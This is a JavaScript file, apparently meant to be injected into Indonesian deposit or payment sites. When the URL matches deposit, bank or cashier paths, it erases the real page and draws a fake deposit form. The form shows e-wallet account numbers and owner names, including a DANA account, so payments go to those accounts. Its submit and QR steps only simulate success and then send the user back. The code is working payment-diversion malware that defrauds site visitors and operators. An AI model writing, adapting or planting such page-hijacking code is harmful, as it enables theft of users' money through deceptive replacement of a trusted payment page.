(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
      :root {
        --primary: #4361ee;
        --primary-dark: #3a56d4;
        --secondary: #06d6a0;
        --secondary-dark: #05c793;
        --accent: #7209b7;
        --accent-dark: #5a0a8c;
        --danger: #ef476f;
        --warning: #ffd166;
        --warning-dark: #fbbf24;
        --dark: #121826;
        --dark-light: #1e293b;
        --dark-lighter: #2d3748;
        --light: #f8fafc;
        --light-gray: #cbd5e1;
        --border-radius-lg: 16px;
        --border-radius-md: 12px;
        --border-radius-sm: 8px;
        --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.25);
        --box-shadow-light: 0 5px 15px rgba(0, 0, 0, 0.1);
        --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        --gradient-primary: linear-gradient(135deg, #4361ee 0%, #3a56d4 100%);
        --gradient-secondary: linear-gradient(135deg, #06d6a0 0%, #05c793 100%);
        --gradient-accent: linear-gradient(135deg, #7209b7 0%, #5a0a8c 100%);
        --gradient-dark: linear-gradient(135deg, #121826 0%, #1e293b 100%);
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        font-family: 'Inter', 'Poppins', sans-serif;
        background: var(--gradient-dark);
        color: var(--light);
        min-height: 100vh;
        padding: 20px;
        line-height: 1.6;
      }
      
      .deposit-container {
        max-width: 550px;
        margin: 0 auto;
      }
      
      .glass-card {
        background: rgba(30, 41, 59, 0.85);
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: var(--border-radius-lg);
        box-shadow: var(--box-shadow);
        overflow: hidden;
      }
      
      .header-section {
        background: var(--gradient-primary);
        padding: 28px 24px;
        text-align: center;
        position: relative;
        overflow: hidden;
      }
      
      .header-section::before {
        content: '';
        position: absolute;
        top: -50%;
        left: -50%;
        width: 200%;
        height: 200%;
        background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
        opacity: 0.3;
      }
      
      .header-icon {
        font-size: 42px;
        margin-bottom: 15px;
        background: rgba(255, 255, 255, 0.15);
        width: 80px;
        height: 80px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 20px;
        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      }
      
      .header-title {
        font-size: 26px;
        font-weight: 700;
        margin-bottom: 8px;
        letter-spacing: 0.5px;
      }
      
      .header-subtitle {
        font-size: 15px;
        opacity: 0.9;
        font-weight: 400;
        max-width: 80%;
        margin: 0 auto;
      }
      
      .alert-marquee {
        background: linear-gradient(90deg, rgba(251, 191, 36, 0.15) 0%, rgba(251, 191, 36, 0.08) 100%);
        border-bottom: 1px solid rgba(251, 191, 36, 0.2);
        padding: 14px 0;
        overflow: hidden;
      }
      
      .marquee-content {
        display: flex;
        animation: marquee 25s linear infinite;
        white-space: nowrap;
      }
      
      .marquee-item {
        display: inline-flex;
        align-items: center;
        gap: 10px;
        padding: 0 25px;
        font-size: 14px;
        color: #fbbf24;
        font-weight: 500;
      }
      
      @keyframes marquee {
        0% { transform: translateX(0); }
        100% { transform: translateX(-50%); }
      }
      
      .main-content {
        padding: 28px 24px;
      }
      
      .nav-tabs-custom {
        display: flex;
        gap: 10px;
        margin-bottom: 25px;
        background: rgba(15, 23, 42, 0.7);
        padding: 8px;
        border-radius: var(--border-radius-md);
        border: 1px solid rgba(255, 255, 255, 0.08);
      }
      
      .nav-tab-custom {
        flex: 1;
        background: transparent;
        border: none;
        color: var(--light-gray);
        padding: 14px 12px;
        border-radius: var(--border-radius-sm);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .nav-tab-custom.active {
        background: var(--gradient-primary);
        color: white;
        box-shadow: 0 4px 12px rgba(67, 97, 238, 0.3);
      }
      
      .nav-tab-custom:hover:not(.active) {
        background: rgba(255, 255, 255, 0.05);
        transform: translateY(-2px);
      }
      
      .support-btn {
        width: 100%;
        background: var(--gradient-accent);
        color: white;
        border: none;
        padding: 16px;
        border-radius: var(--border-radius-md);
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: var(--transition);
        margin-bottom: 25px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        box-shadow: 0 6px 18px rgba(114, 9, 183, 0.3);
      }
      
      .support-btn:hover {
        transform: translateY(-3px);
        box-shadow: 0 10px 25px rgba(114, 9, 183, 0.4);
      }
      
      .form-section {
        display: none;
        animation: fadeInUp 0.5s cubic-bezier(0.4, 0, 0.2, 1);
      }
      
      .form-section.active {
        display: block;
      }
      
      @keyframes fadeInUp {
        from {
          opacity: 0;
          transform: translateY(15px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }
      
      .form-label-custom {
        display: block;
        margin-bottom: 10px;
        font-size: 15px;
        font-weight: 600;
        color: var(--light);
        display: flex;
        align-items: center;
        gap: 8px;
      }
      
      .form-select-custom, .form-input-custom {
        width: 100%;
        padding: 16px;
        background: rgba(15, 23, 42, 0.7);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: var(--border-radius-md);
        font-size: 16px;
        color: var(--light);
        transition: var(--transition);
        font-family: 'Inter', sans-serif;
      }
      
      .form-select-custom:focus, .form-input-custom:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(67, 97, 238, 0.2);
        background: rgba(15, 23, 42, 0.9);
      }
      
      .bank-details-card {
        background: rgba(15, 23, 42, 0.7);
        border-radius: var(--border-radius-md);
        padding: 24px;
        margin-top: 25px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        display: none;
        animation: fadeIn 0.5s ease;
      }
      
      .bank-details-card.active {
        display: block;
      }
      
      .bank-header {
        display: flex;
        align-items: center;
        gap: 18px;
        margin-bottom: 22px;
        padding-bottom: 18px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
      }
      
      .bank-logo-container {
        width: 70px;
        height: 70px;
        border-radius: 12px;
        background: white;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 10px;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
      }
      
      .bank-logo {
        max-width: 100%;
        max-height: 100%;
        object-fit: contain;
      }
      
      .bank-info h4 {
        font-size: 20px;
        font-weight: 700;
        margin-bottom: 5px;
      }
      
      .bank-info p {
        font-size: 14px;
        color: var(--light-gray);
      }
      
      .account-number-section {
        background: rgba(30, 41, 59, 0.7);
        border-radius: var(--border-radius-md);
        padding: 18px;
        margin-bottom: 22px;
        border: 1px solid rgba(255, 255, 255, 0.08);
      }
      
      .account-number-label {
        font-size: 14px;
        color: var(--light-gray);
        margin-bottom: 8px;
        display: flex;
        align-items: center;
        gap: 8px;
      }
      
      .account-number-display {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      
      .account-number {
        font-size: 20px;
        font-weight: 700;
        letter-spacing: 1.2px;
        font-family: 'Courier New', monospace;
        color: var(--light);
      }
      
      .copy-btn-custom {
        background: var(--gradient-primary);
        color: white;
        border: none;
        border-radius: var(--border-radius-sm);
        padding: 10px 18px;
        font-size: 14px;
        font-weight: 600;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        gap: 8px;
        box-shadow: 0 4px 12px rgba(67, 97, 238, 0.3);
      }
      
      .copy-btn-custom:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 18px rgba(67, 97, 238, 0.4);
      }
      
      .alert-custom {
        background: rgba(251, 191, 36, 0.1);
        border-left: 4px solid var(--warning-dark);
        padding: 16px;
        border-radius: 0 var(--border-radius-md) var(--border-radius-md) 0;
        margin: 20px 0;
        font-size: 14px;
        display: flex;
        align-items: flex-start;
        gap: 12px;
      }
      
      .alert-custom.info {
        background: rgba(67, 97, 238, 0.1);
        border-left-color: var(--primary);
      }
      
      .submit-btn {
        width: 100%;
        background: var(--gradient-secondary);
        color: white;
        border: none;
        padding: 18px;
        border-radius: var(--border-radius-md);
        font-weight: 700;
        font-size: 17px;
        cursor: pointer;
        transition: var(--transition);
        margin-top: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        box-shadow: 0 6px 18px rgba(6, 214, 160, 0.3);
      }
      
      .submit-btn:hover:not(:disabled) {
        transform: translateY(-3px);
        box-shadow: 0 10px 25px rgba(6, 214, 160, 0.4);
      }
      
      .submit-btn:disabled {
        background: var(--dark-lighter);
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
      }
      
      .qris-container {
        text-align: center;
        margin-top: 25px;
        display: none;
      }
      
      .qris-container.active {
        display: block;
        animation: fadeInUp 0.5s ease;
      }
      
      .qris-card {
        background: white;
        border-radius: var(--border-radius-md);
        padding: 25px;
        margin: 0 auto 25px;
        max-width: 280px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
        border: 1px solid rgba(0, 0, 0, 0.05);
      }
      
      .qris-image {
        width: 100%;
        height: auto;
        border-radius: var(--border-radius-sm);
      }
      
      .qris-actions {
        display: flex;
        gap: 12px;
        margin-top: 25px;
      }
      
      .qris-action-btn {
        flex: 1;
        padding: 16px;
        border-radius: var(--border-radius-md);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .download-qris-btn {
        background: var(--gradient-primary);
        color: white;
        box-shadow: 0 4px 12px rgba(67, 97, 238, 0.3);
      }
      
      .download-qris-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 18px rgba(67, 97, 238, 0.4);
      }
      
      .payment-done-btn {
        background: var(--gradient-secondary);
        color: white;
        box-shadow: 0 4px 12px rgba(6, 214, 160, 0.3);
      }
      
      .payment-done-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 18px rgba(6, 214, 160, 0.4);
      }
      
      .spinner-custom {
        width: 48px;
        height: 48px;
        border: 4px solid rgba(255, 255, 255, 0.1);
        border-top: 4px solid var(--primary);
        border-radius: 50%;
        animation: spin 1s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
        margin: 35px auto;
      }
      
      @keyframes spin {
        to { transform: rotate(360deg); }
      }
      
      .footer-section {
        text-align: center;
        padding: 25px 24px;
        border-top: 1px solid rgba(255, 255, 255, 0.08);
      }
      
      .footer-image {
        max-width: 85%;
        border-radius: var(--border-radius-md);
        opacity: 0.9;
        transition: var(--transition);
        filter: brightness(0.9);
      }
      
      .footer-image:hover {
        opacity: 1;
        filter: brightness(1);
      }
      
      .toast-custom {
        position: fixed;
        bottom: 40px;
        left: 50%;
        transform: translateX(-50%) translateY(100px);
        min-width: 320px;
        max-width: 90%;
        text-align: center;
        padding: 18px 24px;
        border-radius: var(--border-radius-md);
        font-size: 15px;
        font-weight: 600;
        opacity: 0;
        pointer-events: none;
        transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.4s ease;
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        backdrop-filter: blur(10px);
        -webkit-backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
      }
      
      .toast-custom.show {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
      }
      
      .toast-custom.success {
        background: rgba(6, 214, 160, 0.9);
        color: white;
      }
      
      .toast-custom.error {
        background: rgba(239, 71, 111, 0.9);
        color: white;
      }
      
      .toast-custom.info {
        background: rgba(67, 97, 238, 0.9);
        color: white;
      }
      
      @media (max-width: 576px) {
        body {
          padding: 15px;
        }
        
        .header-section {
          padding: 24px 20px;
        }
        
        .header-title {
          font-size: 22px;
        }
        
        .main-content {
          padding: 24px 20px;
        }
        
        .nav-tab-custom {
          font-size: 14px;
          padding: 12px 10px;
        }
        
        .qris-actions {
          flex-direction: column;
        }
        
        .toast-custom {
          min-width: 280px;
          padding: 16px 20px;
          bottom: 30px;
        }
      }
      
      /* Custom Bootstrap overrides */
      .form-select-custom option {
        background: var(--dark-light);
        color: var(--light);
      }
      
      /* Loading animation for buttons */
      @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
      }
      
      .loading {
        animation: pulse 1.5s infinite;
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="deposit-container">
      <div class="glass-card">
        <!-- Header Section -->
        <div class="header-section">
          <div class="header-icon">
            <i class="fas fa-credit-card fa-2x"></i>
          </div>
          <h1 class="header-title">Formulir Deposit</h1>
          <p class="header-subtitle">Lakukan deposit dengan cepat, aman, dan terpercaya</p>
        </div>
        
        <!-- Alert Marquee -->
        <div class="alert-marquee">
          <div class="marquee-content">
            <div class="marquee-item">
              <i class="fas fa-exclamation-circle"></i>
              <span>Deposit wajib sesuai dengan yang ada di formulir deposit</span>
            </div>
            <div class="marquee-item">
              <i class="fas fa-exclamation-circle"></i>
              <span>Transaksi pertama wajib menggunakan kode unik (contoh: 50.123)</span>
            </div>
            <div class="marquee-item">
              <i class="fas fa-exclamation-circle"></i>
              <span>Jika tidak sesuai syarat, deposit akan gagal diproses</span>
            </div>
          </div>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
          <!-- Navigation Tabs -->
          <div class="nav-tabs-custom">
            <button class="nav-tab-custom active" onclick="switchTab('manual')">
              <i class="fas fa-hand-holding-usd"></i>
              <span>Deposit Manual</span>
            </button>
            <button class="nav-tab-custom" onclick="switchTab('auto')">
              <i class="fas fa-qrcode"></i>
              <span>QRIS Otomatis</span>
            </button>
          </div>
          
          <!-- Support Button -->
          <button class="support-btn" onclick="openHelp()">
            <i class="fas fa-headset"></i>
            <span>Butuh Bantuan? Hubungi CS Kami</span>
          </button>
          
          <!-- Manual Deposit Section -->
          <div id="manual-section" class="form-section active">
            <div class="mb-4">
              <label class="form-label-custom" for="bank-select">
                <i class="fas fa-university"></i>
                Pilih Metode Pembayaran
              </label>
              <select class="form-select-custom" id="bank-select" onchange="selectMethod(this.value)">
                <option value="" selected disabled>-- Pilih metode deposit --</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg","name":"DANA","number":"0895327827948","owner":"M ALVIN"}'>DANA</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dari_OVO.svg/1200px-Logo_dari_OVO.svg.png","name":"OVO","number":"089912345678","owner":"JOHN DOE"}'>OVO</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/2560px-Gopay_logo.svg.png","name":"GOPAY","number":"089987654321","owner":"JANE SMITH"}'>GOPAY</option>
                <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/LinkAja_logo.svg/2560px-LinkAja_logo.svg.png","name":"LINKAJA","number":"089512345678","owner":"PT. LINKAJA"}'>LINKAJA</option>
              </select>
            </div>
            
            <!-- Bank Details Card -->
            <div id="bank-card" class="bank-details-card">
              <div class="bank-header">
                <div class="bank-logo-container">
                  <img id="bank-logo" class="bank-logo" src="" alt="Logo Bank">
                </div>
                <div class="bank-info">
                  <h4 id="bank-name"></h4>
                  <p id="bank-owner"></p>
                </div>
              </div>
              
              <div class="account-number-section">
                <div class="account-number-label">
                  <i class="fas fa-wallet"></i>
                  <span>Nomor Rekening / E-Wallet</span>
                </div>
                <div class="account-number-display">
                  <span id="bank-number" class="account-number"></span>
                  <button class="copy-btn-custom" onclick="copyNumber()">
                    <i class="far fa-copy"></i>
                    <span>Salin</span>
                  </button>
                </div>
              </div>
              
              <div class="alert-custom">
                <i class="fas fa-exclamation-triangle"></i>
                <div>
                  <strong>Perhatian!</strong> Pastikan Anda mentransfer ke nomor di atas dengan benar. Transfer ke nomor yang salah bukan tanggung jawab kami.
                </div>
              </div>
              
              <div class="mb-4">
                <label class="form-label-custom" for="manual-nominal">
                  <i class="fas fa-money-bill-wave"></i>
                  Nominal Deposit (Min. Rp 50.000)
                </label>
                <input class="form-input-custom" id="manual-nominal" type="number" min="50000" placeholder="Masukkan nominal, contoh: 50000">
              </div>
              
              <button class="submit-btn" onclick="submitManualDeposit()" id="manual-submit-btn">
                <i class="fas fa-paper-plane"></i>
                <span>Kirim Deposit</span>
              </button>
              
              <div id="manual-result"></div>
            </div>
          </div>
          
          <!-- QRIS Section -->
          <div id="auto-section" class="form-section">
            <div class="mb-4">
              <label class="form-label-custom" for="auto-nominal">
                <i class="fas fa-money-bill-wave"></i>
                Nominal Deposit (Min. Rp 50.000)
              </label>
              <input class="form-input-custom" id="auto-nominal" type="number" min="50000" placeholder="Masukkan nominal, contoh: 50000">
            </div>
            
            <div class="alert-custom info">
              <i class="fas fa-info-circle"></i>
              <div>
                QRIS dapat digunakan untuk berbagai e-wallet dan mobile banking. Setelah membuat QRIS, scan dengan aplikasi pembayaran favorit Anda.
              </div>
            </div>
            
            <button class="submit-btn" onclick="generateQRIS()" id="qris-generate-btn">
              <i class="fas fa-qrcode"></i>
              <span>Buat QRIS Sekarang</span>
            </button>
            
            <!-- QRIS Container -->
            <div id="qr-container" class="qris-container">
              <div class="qris-card">
                <img id="qris-img" class="qris-image" src="" alt="Kode QRIS">
              </div>
              
              <div class="alert-custom">
                <i class="fas fa-camera"></i>
                <div>
                  <strong>Panduan:</strong> Scan QR code di atas menggunakan aplikasi e-wallet atau mobile banking Anda. Pastikan nominal sudah sesuai sebelum melakukan pembayaran.
                </div>
              </div>
              
              <div class="qris-actions">
                <button class="qris-action-btn download-qris-btn" onclick="downloadQRIS()">
                  <i class="fas fa-download"></i>
                  <span>Download QR</span>
                </button>
                <button class="qris-action-btn payment-done-btn" onclick="finishPayment()">
                  <i class="fas fa-check-circle"></i>
                  <span>Sudah Bayar</span>
                </button>
              </div>
            </div>
            
            <div id="auto-result"></div>
          </div>
        </div>
        
        <!-- Footer -->
        <div class="footer-section">
          <img class="footer-image" src="https://img.freepik.com/free-vector/secure-payment-concept-illustration_114360-3454.jpg?w=1380&t=st=1677839244~exp=1677839844~hmac=2a168a7086e9b68d80f95153137f366bdcd4552c560b3bf6eb73d51fcd9e27f4" alt="Pembayaran Aman">
        </div>
      </div>
    </div>
    
    <!-- Toast Notification -->
    <div id="toast" class="toast-custom"></div>
  `;

  // Toast Notification System
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    
    let icon = "";
    switch(type) {
      case "success":
        icon = "check-circle";
        break;
      case "error":
        icon = "exclamation-circle";
        break;
      case "info":
        icon = "info-circle";
        break;
      default:
        icon = "info-circle";
    }
    
    toast.innerHTML = `
      <i class="fas fa-${icon}"></i>
      <span>${msg}</span>
    `;
    
    toast.className = `toast-custom ${type}`;
    
    // Force reflow
    toast.offsetHeight;
    
    toast.classList.add("show");
    
    setTimeout(() => {
      toast.classList.remove("show");
    }, 3000);
  }

  // Tab Switching Function
  window.switchTab = function (tab) {
    // Update active tab button
    document.querySelectorAll('.nav-tab-custom').forEach(btn => {
      btn.classList.remove('active');
    });
    
    // Show selected section
    document.querySelectorAll('.form-section').forEach(section => {
      section.classList.remove('active');
    });
    
    if (tab === 'manual') {
      document.querySelector('.nav-tab-custom:nth-child(1)').classList.add('active');
      document.getElementById('manual-section').classList.add('active');
    } else {
      document.querySelector('.nav-tab-custom:nth-child(2)').classList.add('active');
      document.getElementById('auto-section').classList.add('active');
    }
  };

  // Select Payment Method
  window.selectMethod = function (jsonStr) {
    if (!jsonStr) {
      document.getElementById('bank-card').classList.remove('active');
      return;
    }
    
    try {
      const method = JSON.parse(jsonStr);
      
      // Update bank details
      document.getElementById('bank-logo').src = method.logo;
      document.getElementById('bank-name').textContent = method.name;
      document.getElementById('bank-number').textContent = formatPhoneNumber(method.number);
      document.getElementById('bank-owner').textContent = `a/n ${method.owner}`;
      
      // Show bank card with animation
      document.getElementById('bank-card').classList.add('active');
      
      // Reset input
      document.getElementById('manual-nominal').value = '';
      
      showToast(`${method.name} dipilih`, "info");
    } catch (error) {
      showToast('Gagal memuat metode pembayaran', 'error');
      console.error('Error parsing payment method:', error);
    }
  };

  // Format phone number for display
  function formatPhoneNumber(number) {
    if (!number) return '';
    
    // Remove non-digits
    const cleaned = number.replace(/\D/g, '');
    
    // Format as Indonesian phone number
    if (cleaned.length === 11 || cleaned.length === 12) {
      return cleaned.replace(/(\d{3})(\d{4})(\d{4})/, '$1-$2-$3');
    }
    
    return number;
  }

  // Copy Account Number
  window.copyNumber = function () {
    const numElement = document.getElementById('bank-number');
    let num = numElement.textContent;
    
    // Remove formatting for copying
    num = num.replace(/-/g, '');
    
    if (!num || num.trim() === '') {
      showToast('Nomor rekening kosong', 'error');
      return;
    }
    
    // Update button temporarily
    const copyBtn = document.querySelector('.copy-btn-custom');
    const originalHTML = copyBtn.innerHTML;
    copyBtn.innerHTML = '<i class="fas fa-check"></i><span>Tersalin!</span>';
    copyBtn.classList.add('loading');
    
    navigator.clipboard.writeText(num).then(() => {
      showToast('Nomor rekening berhasil disalin', 'success');
      
      // Revert button after 2 seconds
      setTimeout(() => {
        copyBtn.innerHTML = originalHTML;
        copyBtn.classList.remove('loading');
      }, 2000);
    }).catch((err) => {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = num;
      document.body.appendChild(textArea);
      textArea.select();
      
      try {
        document.execCommand('copy');
        showToast('Nomor rekening berhasil disalin', 'success');
      } catch (e) {
        showToast('Gagal menyalin nomor rekening', 'error');
      }
      
      document.body.removeChild(textArea);
      
      // Revert button
      setTimeout(() => {
        copyBtn.innerHTML = originalHTML;
        copyBtn.classList.remove('loading');
      }, 2000);
    });
  };

  // Submit Manual Deposit
  window.submitManualDeposit = function () {
    const nominal = Number(document.getElementById('manual-nominal').value || 0);
    const bankCard = document.getElementById('bank-card');
    
    // Validation
    if (!bankCard.classList.contains('active')) {
      showToast('Pilih metode pembayaran terlebih dahulu', 'error');
      return;
    }
    
    if (nominal < 50000 || isNaN(nominal)) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      document.getElementById('manual-nominal').focus();
      return;
    }
    
    const btn = document.getElementById('manual-submit-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Memproses...</span>';
    
    const resultDiv = document.getElementById('manual-result');
    resultDiv.innerHTML = '<div class="spinner-custom"></div>';
    
    // Simulate API call
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      
      // Show success message
      resultDiv.innerHTML = `
        <div class="alert-custom info">
          <i class="fas fa-check-circle"></i>
          <div>
            <strong>Deposit Berhasil Dikirim!</strong><br>
            Deposit sebesar <strong>Rp ${nominal.toLocaleString('id-ID')}</strong> sedang diproses. Silakan tunggu konfirmasi dalam waktu 1-5 menit.
          </div>
        </div>
      `;
      
      showToast('Deposit berhasil dikirim!', 'success');
      
      // Redirect back after 5 seconds
      setTimeout(() => {
        showToast('Mengalihkan ke halaman sebelumnya...', 'info');
        setTimeout(() => history.back(), 1000);
      }, 5000);
    }, 2500);
  };

  // Generate QRIS
  window.generateQRIS = function () {
    const nominal = Number(document.getElementById('auto-nominal').value || 0);
    
    // Validation
    if (nominal < 50000 || isNaN(nominal)) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      document.getElementById('auto-nominal').focus();
      return;
    }
    
    const btn = document.getElementById('qris-generate-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Membuat QRIS...</span>';
    
    const resultDiv = document.getElementById('auto-result');
    resultDiv.innerHTML = '<div class="spinner-custom"></div>';
    
    // Simulate QR generation
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      resultDiv.innerHTML = '';
      
      // Use a placeholder QR code
      const qrUrl = "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" + 
                   encodeURIComponent(`https://payment.example.com/deposit?amount=${nominal}&timestamp=${Date.now()}`);
      
      document.getElementById('qris-img').src = qrUrl;
      document.getElementById('qr-container').classList.add('active');
      
      showToast(`QRIS untuk Rp ${nominal.toLocaleString('id-ID')} berhasil dibuat!`, 'success');
      
      // Scroll to QR code smoothly
      document.getElementById('qr-container').scrollIntoView({
        behavior: 'smooth',
        block: 'center'
      });
    }, 2000);
  };

  // Download QRIS
  window.downloadQRIS = function () {
    const qrImg = document.getElementById('qris-img');
    const qrUrl = qrImg.src;
    
    if (!qrUrl || qrUrl === '') {
      showToast('QRIS belum dibuat', 'error');
      return;
    }
    
    const nominal = document.getElementById('auto-nominal').value || 'deposit';
    const link = document.createElement('a');
    link.href = qrUrl;
    link.download = `qris-deposit-${nominal}-${Date.now()}.png`;
    link.target = '_blank';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showToast('QRIS berhasil diunduh', 'success');
  };

  // Finish Payment
  window.finishPayment = function () {
    showToast('Terima kasih! Pembayaran Anda akan segera diproses.', 'success');
    
    // Show confirmation message
    const qrContainer = document.getElementById('qr-container');
    qrContainer.innerHTML += `
      <div class="alert-custom info" style="margin-top: 20px;">
        <i class="fas fa-clock"></i>
        <div>
          <strong>Pembayaran Diterima</strong><br>
          Silakan tunggu 1-3 menit untuk proses verifikasi. Anda akan menerima notifikasi saat deposit berhasil.
        </div>
      </div>
    `;
    
    setTimeout(() => {
      showToast('Mengalihkan ke halaman utama...', 'info');
      setTimeout(() => history.back(), 1500);
    }, 3000);
  };

  // Open Help
  window.openHelp = function () {
    showToast('Membuka layanan bantuan pelanggan...', 'info');
    
    // Simulate opening chat
    setTimeout(() => {
      const helpWindow = window.open("https://direct.lc.chat/19347249", "_blank");
      
      if (helpWindow) {
        showToast('Layanan bantuan dibuka di tab baru', 'success');
      } else {
        showToast('Izinkan pop-up untuk membuka layanan bantuan', 'error');
      }
    }, 800);
  };

  // Initialize when DOM is loaded
  window.addEventListener('DOMContentLoaded', () => {
    // Add input validation styling
    const nominalInputs = document.querySelectorAll('.form-input-custom[type="number"]');
    nominalInputs.forEach(input => {
      input.addEventListener('input', function() {
        const value = Number(this.value);
        
        if (this.value && value >= 50000) {
          this.style.borderColor = '#06d6a0';
          this.style.boxShadow = '0 0 0 3px rgba(6, 214, 160, 0.2)';
        } else if (this.value && value < 50000) {
          this.style.borderColor = '#ef476f';
          this.style.boxShadow = '0 0 0 3px rgba(239, 71, 111, 0.2)';
        } else {
          this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
          this.style.boxShadow = 'none';
        }
      });
    });
    
    // Add ripple effect to buttons
    document.querySelectorAll('button').forEach(button => {
      button.addEventListener('click', function(e) {
        const x = e.clientX - e.target.getBoundingClientRect().left;
        const y = e.clientY - e.target.getBoundingClientRect().top;
        
        const ripple = document.createElement('span');
        ripple.classList.add('ripple');
        ripple.style.left = x + 'px';
        ripple.style.top = y + 'px';
        
        this.appendChild(ripple);
        
        setTimeout(() => {
          ripple.remove();
        }, 600);
      });
    });
    
    // Add CSS for ripple effect
    const rippleStyle = document.createElement('style');
    rippleStyle.textContent = `
      .ripple {
        position: absolute;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.6);
        transform: scale(0);
        animation: ripple-animation 0.6s linear;
        pointer-events: none;
      }
      
      @keyframes ripple-animation {
        to {
          transform: scale(4);
          opacity: 0;
        }
      }
      
      button {
        position: relative;
        overflow: hidden;
      }
    `;
    document.head.appendChild(rippleStyle);
    
    // Show welcome message
    setTimeout(() => {
      showToast('Selamat datang di formulir deposit kami!', 'info');
    }, 1000);
  });
})();
